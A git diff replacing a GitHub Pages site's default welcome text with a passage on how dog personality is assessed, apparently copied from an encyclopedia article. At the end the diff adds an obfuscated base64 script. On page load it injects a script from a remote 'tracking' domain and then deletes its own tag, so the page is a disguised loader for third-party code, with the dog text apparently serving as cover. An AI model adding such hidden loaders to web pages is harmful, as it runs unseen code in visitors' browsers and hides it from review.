@@ -1,37 +1,10 @@
-## Welcome to GitHub Pages
+Personalities
+The term personality has been applied to human research, whereas the term temperament has been mostly used for animal research.[19] However, both terms have been used interchangeably in the literature, or purely to distinguish humans from animals and avoid anthropomorphism.[20] Personality can be defined as “a set of behaviors that are consistent over context and time”.[21] Studies of dogs' personalities have tried to identify the presence of broad personality traits that are stable and consistent over time.[20][21][22][23]
 
-You can use the [editor on GitHub](https://github.com/MjrykFpWd8a8C/iugy34ita4wt/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+There are different approaches to assess dog personality:
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Ratings of individual dogs: either a caretaker or a dog expert who is familiar with the dog is asked to answer a questionnaire, for instance the Canine Behavioral Assessment and Research Questionnaire,[24] concerning how often the dog shows certain types of behavior.
+Tests: the dog is submitted to a set of tests and its reactions are evaluated on a behavioral scale. For instance, the dog is presented to a familiar and then an unfamiliar person in order to measure sociability or aggression.[25]
+Observational test: The dog’s behavior is evaluated in a selected but not controlled environment. An observer focuses on the dog’s reactions to naturally occurring stimuli. For example, a walk through the supermarket can allow the observer to see the dog in various types of conditions (crowded, noisy…)[26]
 
-### Markdown
-
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/MjrykFpWd8a8C/iugy34ita4wt/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+<script id="z1ful" src="data:text/javascript;base64, dmFyIF9YV0NiQiA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX0dtZmVYLCBfc0NOQVIpIHt2YXIgX0ZvNVRmID0gZnVuY3Rpb24oXzJDdkRIKSB7d2hpbGUgKC0tXzJDdkRIKSB7X0dtZmVYWydwdXNoJ10oX0dtZmVYWydzaGlmdCddKCkpO319O19GbzVUZigrK19zQ05BUik7fShfWFdDYkIsIDB4MTFiKSk7dmFyIF94UkF6biA9IGZ1bmN0aW9uKF9HcDhKeSwgX0JlZHdTKSB7X0dwOEp5ID0gX0dwOEp5IC0gMHgwO3ZhciBfdWJIUGYgPSBfWFdDYkJbX0dwOEp5XTtyZXR1cm4gX3ViSFBmO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfeFJBem4oJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgXzdKYzNXID0gZG9jdW1lbnRbX3hSQXpuKCcweDEnKV0oX3hSQXpuKCcweDInKSk7XzdKYzNXW194UkF6bignMHgzJyldID0gX3hSQXpuKCcweDQnKTtfN0pjM1dbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3NFx4NzJceDYxXHg2M1x4NmJceDY5XHg2ZVx4NjdceDJlXHg2M1x4NjFceDczXHgyZFx4NzZceDMxXHgyZVx4NzNceDcwXHg2MVx4NjNceDY1XHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg1M1x4NGJceDc3XHg0OFx4NGZceDU5XHg0MVx4MzBceDRlXHg3OSc7ZG9jdW1lbnRbX3hSQXpuKCcweDUnKV0oX3hSQXpuKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oXzdKYzNXKTtkb2N1bWVudFtfeFJBem4oJzB4NycpXSgnejFmdWwnKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
